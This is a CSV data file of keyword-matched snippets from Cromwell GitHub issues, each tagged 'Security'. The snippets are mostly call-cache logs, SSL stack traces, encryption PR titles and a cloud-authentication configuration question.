Security,"ackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:2:1-20000000034 [788d8048main.all_qced_sample_lists:2:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,81] [info] BT-322 788d8048:main.all_qced_sample_lists:2:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 110EC9F4C25BC9902A0E5B3B8EAB2725.; [2022-12-15 21:28:23,81] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:2:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,81] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:4:1-20000000036 [788d8048main.all_qced_sample_lists:4:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,82] [info] BT-322 788d8048:main.all_qced_sample_lists:4:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 51C3D11209F9A7985345B2FD76E1C699.; [2022-12-15 21:28:23,82] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:4:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,86] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:0:1-20000000038 [788d8048main.all_qced_sample_lists:0:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,86] [info] BT-322 788d8048:main.all_qced_sample_lists:0:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 801EC388A847FBAB78685AE96643853A.; [2022-12-15 21:28:23,86] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:0:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:45157,hash,hashes,45157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"ackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:3:1-20000000035 [788d8048main.all_qced_sample_lists:3:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,80] [info] BT-322 788d8048:main.all_qced_sample_lists:3:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 262BA6F0AB83375414FCD228C0CC6E47.; [2022-12-15 21:28:23,80] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:3:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,81] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:2:1-20000000034 [788d8048main.all_qced_sample_lists:2:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,81] [info] BT-322 788d8048:main.all_qced_sample_lists:2:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 110EC9F4C25BC9902A0E5B3B8EAB2725.; [2022-12-15 21:28:23,81] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:2:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,81] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:4:1-20000000036 [788d8048main.all_qced_sample_lists:4:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,82] [info] BT-322 788d8048:main.all_qced_sample_lists:4:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 51C3D11209F9A7985345B2FD76E1C699.; [2022-12-15 21:28:23,82] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:4:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:44473,hash,hashes,44473,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"ackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:4:1-20000000036 [788d8048main.all_qced_sample_lists:4:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,82] [info] BT-322 788d8048:main.all_qced_sample_lists:4:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 51C3D11209F9A7985345B2FD76E1C699.; [2022-12-15 21:28:23,82] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:4:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,86] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:0:1-20000000038 [788d8048main.all_qced_sample_lists:0:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,86] [info] BT-322 788d8048:main.all_qced_sample_lists:0:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 801EC388A847FBAB78685AE96643853A.; [2022-12-15 21:28:23,86] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:0:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:26,54] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results retrieved (CallCached): 'main.all_qced_sample_lists' (scatter index: Some(5), attempt 1); [2022-12-15 21:28:26,54] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results retrieved (CallCached): 'main.all_qced_sample_lists' (scatter index: Some(1), attempt 1); [2022-12-15 21:28:26,54] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results retrieved (CallCached): 'main.all_qced_sample_lists' (scatter index: Some(3), attempt 1); [2022-12-15 21:28:26,54] [info] 788d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:45841,hash,hashes,45841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"ackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:5:1-20000000037 [788d8048main.all_qced_sample_lists:5:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,78] [info] BT-322 788d8048:main.all_qced_sample_lists:5:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 0EDB33C059ED489B1F78F3502B7DB8AC.; [2022-12-15 21:28:23,78] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:5:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,79] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:1:1-20000000039 [788d8048main.all_qced_sample_lists:1:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,79] [info] BT-322 788d8048:main.all_qced_sample_lists:1:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = DC6FF6846E1CC843B0D79723739936B2.; [2022-12-15 21:28:23,79] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:1:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,80] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:3:1-20000000035 [788d8048main.all_qced_sample_lists:3:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,80] [info] BT-322 788d8048:main.all_qced_sample_lists:3:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 262BA6F0AB83375414FCD228C0CC6E47.; [2022-12-15 21:28:23,80] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:3:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:43105,hash,hashes,43105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"ad.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.securi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7635,secur,security,7635,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"adata with a read batch size of 100000 and a write batch size of 100000; [2019-02-11 10:13:14,75] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-02-11 10:13:15,05] [info] Running with database db.url = jdbc:hsqldb:mem:6b5d8035-4932-4680-b912-34885765f705;shutdown=false;hsqldb.tx=mvcc; [2019-02-11 10:13:15,63] [info] Slf4jLogger started; [2019-02-11 10:13:16,02] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1ddecb5"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-02-11 10:13:16,08] [info] Metadata summary refreshing every 2 seconds.; [2019-02-11 10:13:16,20] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-02-11 10:13:16,23] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-02-11 10:13:16,25] [warn] 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); [2019-02-11 10:13:16,26] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-02-11 10:13:16,33] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-02-11 10:13:17,45] [info] SingleWorkflowRunnerActor: Version 37; [2019-02-11 10:13:17,46] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-02-11 10:13:17,59] [info] Unspecified type (Unspecified version) workflow 52999e15-953f-44d6-aaae-1774c74d2910 submitted; [2019-02-11 10:13:17,65] [info] SingleWorkflowRunnerActor: Workflow submitted 52999e15-953f-44d6-aaae-1774c74d2910; [2019-02-11 10:13:17,65] [info] 1 new workflows fetched; [2019-02-11 10:13:17,66] [info] WorkflowManagerActor Starting workflow 52999e15-953f-44d6-aaae-1774c74d2910; [2019-02-11 10:13:17,67] [info] WorkflowManagerActor Successfully started WorkflowActor-52999e15-953f-44d6-aaae-1774c74d2910; [2019-02-11 10:13:17,67] [info] Retrieved 1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:2427,hash,hash-lookup,2427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['hash'],['hash-lookup']
Security,add AES256 encryption to copyToS3(),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4377:11,encrypt,encryption,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4377,1,['encrypt'],['encryption']
Security,added gpu parsing and validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7091:22,validat,validation,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7091,1,['validat'],['validation']
Security,added stanza related to workflow option encryption,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/377:40,encrypt,encryption,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/377,2,['encrypt'],['encryption']
Security,"adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEv",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:1237,Validat,Validated,1237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174,1,['Validat'],['Validated']
Security,adds AES256 encryption to s3 file uploads and downloads via the ecs-proxy.; important for any workflows that need to be HIPAA compliant.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4264:12,encrypt,encryption,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4264,1,['encrypt'],['encryption']
Security,"ader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.build(SdkDefaultClientBuilder.java:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 more. 2019-07-02 19:16:37,991 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowManagerActor WorkflowActor-10f172e8-b7ba-416f-964e-22ab8c7b38e3 is in a terminal state: WorkflowFailedState",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:16343,validat,validateCredential,16343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['validat'],['validateCredential']
Security,"adinstitute/dsde-docs/issues/1996). Need to put in a Cromwell ticket for this. Basic ask: have Cromwell automatically look for (and co-localize) accessory files when given files with a specific extensions. E.g. if I give it foo.bam file it should look for foo.bai. . Note that sometimes it's just a matter of swapping the extension, but sometimes it's adding another extension, and there can be multiple accessory files, e.g. reference.fasta is always accompanied by both reference.fasta.fai and reference.dict. . This would ideally be configurable by the Cromwell admin, who would set up a list of primary file extensions and their accessory file naming patterns. Bonus points if the user can provide their own config on the command line to override the server's config. And also I want a pet unicorn that farts glitter. ----. WDL folks;; This is a followup from a recent discussion about getting compatible bcbio generated WDL (http://gatkforums.broadinstitute.org/wdl/discussion/9257/object-attribute-access-and-secondary-index-files). Thanks to all the great help you've provided we now have compatible WDL output that passes validation:. https://github.com/bcbio/test_bcbio_cwl/blob/master/run_info-cwl-wdl. This is brilliant, and I'd like to move into testing runs with Cromwell. Before starting this, there is one major area I know we're missing in the conversion, handling of secondary files and directories of files. CWL has the notion of secondaryFiles (http://www.commonwl.org/v1.0/Workflow.html#File) which you can use to block these and ensure they get staged/run next to each other. I use this in bcbio and wanted to figure out the best way to map it into WDL. There are two cases we use these for:. - Index files associated with compressed inputs, like BAM bai indices and bgzip VCF tbi indices. These are a single index file attached to the original file that should get staged in the same directory when running.; - Directories of index files like bwa or snpeff. These are a bit trick",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269:1067,access,access-and-secondary-index-files,1067,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269,1,['access'],['access-and-secondary-index-files']
Security,"adually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; // This allows you to use an alternative service account to launch jobs, by default uses default service account; compute-service-account = ""default""; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""project-test1""; }; }; }; }; }; }; ```. I created the service account from https://cloud.google.com/docs/authentication/getting-started and give the role: Project -> Owner. I've downloaded Google Cloud SDK and run these; ```; gcloud auth login juha.wilppu@gmail.com; gcloud auth application-default login; gcloud config set project project-test1; gsutil ls gs://project-test1 // This command works, so authentication is successful.; ```; **project-test1-59b66448c3ab.json**; ```; {; ""type"": ""service_account"",; ""project_id"": ""project-test1"",; ""private_key_id"": ""59b66448c3ab730097135e1dba83b375a6b57ea3"",; ""private_key"": ""-----BEGIN PRIVATE KEY-----\n(Omitted)\n-----END PRIVATE KEY-----\n"",; ""client_email"": ""project-service@project-test1.iam.gserviceaccount.com"",; ""client_id"": ""104927211954691424974"",; ""auth_uri"": ""https://accounts.google.com/o/oauth2/auth"",; ""token_uri"": ""https://accounts.google.com/o/oauth2/token"",; ""auth_provider_x509_cert_url"": ""https://www.googleapis.com/oauth2/v1/certs"",; ""client_x509_cert_url"": ""https://www.googleapis.com/robot/v1/metadata/x509/project-service%40project-test1.iam.gserviceaccount.com"";",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690:5545,authenticat,authentication,5545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690,1,['authenticat'],['authentication']
Security,"aggregated hashes: initial = B2C071CED641A1EB183DE4A4655F45ED, file = DDF9190E939D36D999E513158D534532.; [2022-12-15 21:28:04,00] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.sex_aneuploidy_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,01] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.white_brits_sample_list:-1:1-20000000013 [788d8048main.white_brits_sample_list:NA:1]: Unrecognized runtime attribute keys:; shortTask, dx_timeout; [2022-12-15 21:28:04,01] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.low_genotyping_quality_sample_list:-1:1-20000000014 [788d8048main.low_genotyping_quality_sample_list:NA:1]: Unrecognized ru; ntime attribute keys: shortTask, dx_timeout; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.white_brits_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = B2C071CED641A1EB183DE4A4655F45ED, file = 9675960412B5394D5D0816ED198FB6EB.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.white_brits_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.low_genotyping_quality_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 3C891C9939496580DDF747805F991E06, file = AAFFF98AC7D58B07E7CE25978A906B00.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.low_genotyping_quality_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,02] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.sex_mismatch_sample_list:-1:1-20000000015 [788d8048main.sex_mismatch_sample_list:NA:1]: Unrecognized runtime attribute keys; : s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:35777,hash,hashes,35777,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(Http",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8004,secur,security,8004,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
